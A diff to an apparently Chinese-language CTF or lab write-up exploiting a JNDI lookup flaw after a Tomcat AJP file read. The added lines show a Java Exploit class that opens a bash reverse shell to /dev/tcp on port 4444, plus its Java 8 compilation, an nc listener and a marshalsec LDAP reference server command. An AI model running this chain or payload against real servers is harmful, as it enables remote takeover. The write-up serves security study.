@@ -63,6 +63,36 @@ python3 tomcat-ajp-lfi.py ip -p 8009 -f WEB-INF/web.xml
 发现连不上问了才知道是移位密码jndi.jsp
 然后进入对应页面
 ![image.png](https://gitee.com/fogpost/photo/raw/master/202603272112518.png)
-发现存在jndilookup漏洞
+发现存在jndilookup漏洞，可以用nc回连
 ![image.png](https://gitee.com/fogpost/photo/raw/master/202603272123359.png)
-找到现成的marshalsec
+找到并编译marshalsec
+
+### 写Exploit.java
+```java
+public class Exploit {
+    static {
+        try {
+            Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/你的IP/4444 0>&1'");
+        } catch (Exception e) {}
+    }
+}
+```
+准备Exploit.class，编译
+```bash
+javac Exploit.java
+## message javax.servlet.ServletException: java.lang.UnsupportedClassVersionError: Exploit has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0
+## 发现版本不对
+javac -source 1.8 -target 1.8 Exploit.java
+##查看把版本
+javap -verbose Exploit.class | grep "major"
+major version: 52
+```
+后台监听
+```
+nc -lvnp 4444
+```
+marshalsec调用
+```
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \  
+"http://192.168.56.130:8000/#Exploit"
+```
